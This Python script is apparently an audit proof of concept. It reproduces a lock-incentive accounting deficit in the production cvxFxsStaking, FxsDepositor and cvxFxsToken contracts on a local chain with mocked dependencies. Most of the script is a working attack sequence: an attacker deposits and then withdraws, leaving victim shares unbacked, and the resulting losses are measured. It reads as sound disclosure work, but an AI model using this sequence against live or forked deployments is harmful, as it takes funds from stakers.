#!/usr/bin/env python3
"""Conditional cvxFxsStaking lock-incentive deficit and real-withdrawal PoC.

Uses production cvxFxsStaking, FxsDepositor, and cvxFxsToken bytecode. FXS and
the external lock staker are local mocks. lockIncentive=30 bps is an explicit
local owner configuration, not a claimed mainnet configuration.
"""
import json
from pathlib import Path
from eth_tester.exceptions import TransactionFailed
from stateful_rewards import Local, E18
from fee_conversion_poc import set_storage, FXS, CVXFXS, FXS_DEPOSIT

ROOT = Path(__file__).resolve().parents[1]


def run_scenario(amount, label, lock_incentive_bps=30):
    l = Local()
    victim, attacker, honest = l.users

    fxs_impl = l.deploy('MockToken', 'FXS', 'FXS')
    l.etch('MockToken', FXS)
    fxs = l.w3.eth.contract(address=FXS, abi=fxs_impl.abi)

    cvx_impl = l.deploy('cvxFxsToken')
    l.etch('cvxFxsToken', CVXFXS)
    cvx = l.w3.eth.contract(address=CVXFXS, abi=cvx_impl.abi)
    set_storage(l, CVXFXS, 5, int(l.deployer, 16))  # inherited ERC20 slots precede operator
    l.tx(cvx.functions.setOperator(FXS_DEPOSIT))

    staker = l.deploy('MockLockStaker')
    depositor_impl = l.deploy('FxsDepositor', staker.address, CVXFXS)
    l.etch('FxsDepositor', FXS_DEPOSIT, depositor_impl.address)
    depositor = l.w3.eth.contract(address=FXS_DEPOSIT, abi=depositor_impl.abi)
    set_storage(l, FXS_DEPOSIT, 1, int(l.deployer, 16))
    l.tx(depositor.functions.setFees(lock_incentive_bps))  # explicit local owner configuration

    staking = l.deploy('cvxFxsStaking')

    # Honest victim obtains cvxFXS through the lock=true path and supplies backing.
    victim_seed = 1000 * E18
    l.tx(fxs.functions.mint(victim, victim_seed))
    l.tx(fxs.functions.approve(FXS_DEPOSIT, victim_seed), victim)
    l.tx(depositor.functions.deposit(victim_seed, True), victim)
    assert cvx.functions.balanceOf(victim).call() == victim_seed
    l.tx(cvx.functions.approve(staking.address, victim_seed), victim)
    l.tx(staking.functions.stake(victim_seed), victim)

    pool_backing_before = cvx.functions.balanceOf(staking.address).call()
    pool_supply_before = staking.functions.totalSupply().call()
    assert pool_backing_before == pool_supply_before == victim_seed

    l.tx(fxs.functions.mint(attacker, amount))
    attacker_fxs_before = fxs.functions.balanceOf(attacker).call()
    attacker_cvx_before = cvx.functions.balanceOf(attacker).call()
    approve_receipt = l.tx(fxs.functions.approve(staking.address, amount), attacker)
    deposit_receipt = l.tx(staking.functions['deposit(uint256)'](amount), attacker)

    expected_fee = amount * lock_incentive_bps // 10000
    expected_direct_cvx = amount - expected_fee
    pool_backing_after_deposit = cvx.functions.balanceOf(staking.address).call()
    pool_supply_after_deposit = staking.functions.totalSupply().call()
    deficit_after_deposit = pool_supply_after_deposit - pool_backing_after_deposit
    assert deficit_after_deposit == expected_fee
    assert staking.functions.balanceOf(attacker).call() == amount

    withdraw_receipt = l.tx(staking.functions.withdraw(amount), attacker)
    attacker_fxs_after = fxs.functions.balanceOf(attacker).call()
    attacker_cvx_after = cvx.functions.balanceOf(attacker).call()
    attacker_fxs_delta = attacker_fxs_after - attacker_fxs_before
    attacker_cvx_delta = attacker_cvx_after - attacker_cvx_before
    assert attacker_fxs_delta == -amount
    assert attacker_cvx_delta == amount
    gross_advantage = attacker_cvx_delta - expected_direct_cvx
    assert gross_advantage == expected_fee

    pool_backing_after_attack = cvx.functions.balanceOf(staking.address).call()
    pool_supply_after_attack = staking.functions.totalSupply().call()
    assert pool_backing_after_attack == victim_seed - expected_fee
    assert pool_supply_after_attack == victim_seed

    victim_full_withdrawal_reverted = False
    if expected_fee:
        try:
            staking.functions.withdraw(victim_seed).call({'from': victim})
        except TransactionFailed:
            victim_full_withdrawal_reverted = True
        assert victim_full_withdrawal_reverted

    # Realize the victim's signed cvxFXS delta; any residual shares are unbacked.
    victim_cvx_before = cvx.functions.balanceOf(victim).call()
    if pool_backing_after_attack:
        l.tx(staking.functions.withdraw(pool_backing_after_attack), victim)
    victim_cvx_delta = cvx.functions.balanceOf(victim).call() - victim_cvx_before
    residual_victim_shares = staking.functions.balanceOf(victim).call()
    residual_pool_backing = cvx.functions.balanceOf(staking.address).call()
    assert residual_victim_shares == expected_fee
    assert residual_pool_backing == 0

    # Direct no-lock deposit is the honest differential baseline.
    l.tx(fxs.functions.mint(honest, amount))
    l.tx(fxs.functions.approve(FXS_DEPOSIT, amount), honest)
    l.tx(depositor.functions.deposit(amount, False), honest)
    honest_direct_cvx = cvx.functions.balanceOf(honest).call()
    assert honest_direct_cvx == expected_direct_cvx

    gas_cost_wei = sum(
        r.gasUsed * r.effectiveGasPrice
        for r in (approve_receipt, deposit_receipt, withdraw_receipt)
    )
    return {
        'label': label,
        'successful_transactions_including_setup': l.actions,
        'attack_amount_fxs_raw': str(amount),
        'lock_incentive_bps': lock_incentive_bps,
        'expected_fee_raw': str(expected_fee),
        'pool_before': {'supply_raw': str(pool_supply_before), 'cvxfxs_backing_raw': str(pool_backing_before)},
        'pool_after_attacker_deposit': {
            'supply_raw': str(pool_supply_after_deposit),
            'cvxfxs_backing_raw': str(pool_backing_after_deposit),
            'deficit_raw': str(deficit_after_deposit),
        },
        'attacker': {
            'address': attacker,
            'fxs_delta_raw': str(attacker_fxs_delta),
            'cvxfxs_delta_raw': str(attacker_cvx_delta),
            'honest_direct_cvxfxs_baseline_raw': str(expected_direct_cvx),
            'gross_advantage_over_direct_baseline_cvxfxs_raw': str(gross_advantage),
            'approve_deposit_withdraw_gas_cost_wei': str(gas_cost_wei),
        },
        'pool_after_attacker_withdrawal': {
            'supply_raw': str(pool_supply_after_attack),
            'cvxfxs_backing_raw': str(pool_backing_after_attack),
        },
        'victim': {
            'address': victim,
            'initial_shares_raw': str(victim_seed),
            'full_withdrawal_reverted_for_insufficient_pool_backing': victim_full_withdrawal_reverted,
            'cvxfxs_delta_from_partial_withdrawal_raw': str(victim_cvx_delta),
            'residual_unbacked_shares_raw': str(residual_victim_shares),
        },
        'honest_direct_control_cvxfxs_received_raw': str(honest_direct_cvx),
        'net_pnl_status': 'UNPRICED: gross cvxFXS advantage is measured; FXS/cvxFXS swap proceeds and gas-to-token conversion are not established.',
    }


def main():
    scenarios = [
        run_scenario(1000 * E18, '1000 FXS demonstration'),
        run_scenario(334, 'minimum integer amount with 30 bps fee rounding to one wei'),
        run_scenario(333, 'negative boundary: fee rounds to zero'),
        run_scenario(1000 * E18, 'zero-incentive control matching user-supplied Etherscan screenshot', 0),
    ]
    result = {
        'mode': 'LOCAL_PRODUCTION_BYTECODE_CONDITIONAL_STAKING_DEFICIT',
        'production_contracts': ['cvxFxsStaking', 'FxsDepositor', 'cvxFxsToken'],
        'mocked_external_dependencies': ['FXS token', 'lock staker'],
        'configuration': {
            'tested_lock_incentive_bps': [30, 0],
            'user_supplied_etherscan_screenshot_lock_incentive_bps': 0,
            'screenshot_block_number': None,
            'pinned_mainnet_configuration_verified': False,
        },
        'scenarios': scenarios,
        'status': 'PASS_CONDITIONAL_DEFICIT_AND_REAL_WITHDRAWAL_REPRODUCED',
        'promotion_status': 'NOT_A_CURRENT_MAINNET_FINDING: zero-incentive control has no deficit; nonzero-fee behavior is latent/conditional only. Screenshot is not block-pinned fork evidence.',
        'successful_transactions_including_setup_all_scenarios': sum(s['successful_transactions_including_setup'] for s in scenarios),
    }
    out = ROOT / 'evidence/staking-lock-incentive-poc.json'
    out.write_text(json.dumps(result, indent=2) + '\n')
    print(json.dumps(result, indent=2))


if __name__ == '__main__':
    main()
